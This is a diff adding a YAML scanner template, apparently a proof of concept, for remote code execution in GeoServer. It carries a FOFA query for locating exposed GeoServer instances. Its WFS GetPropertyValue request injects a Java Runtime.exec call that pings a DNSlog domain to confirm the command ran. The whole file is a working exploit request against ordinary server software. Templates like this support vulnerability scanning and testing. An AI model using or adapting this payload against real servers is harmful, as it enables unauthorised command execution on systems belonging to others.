@@ -1,0 +1,17 @@
+id: poc-yaml-geoserver-topp-rce
+info:
+  name: GeoServer topp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: geoserver
+  fofa: app="GeoServer"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /geoserver/topp/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=topp%3Astates&valueReference=exec(java.lang.Runtime.getRuntime()%2C'ping%20{{.domain}}')
+  expression: reverse.Verify()
+transport: http
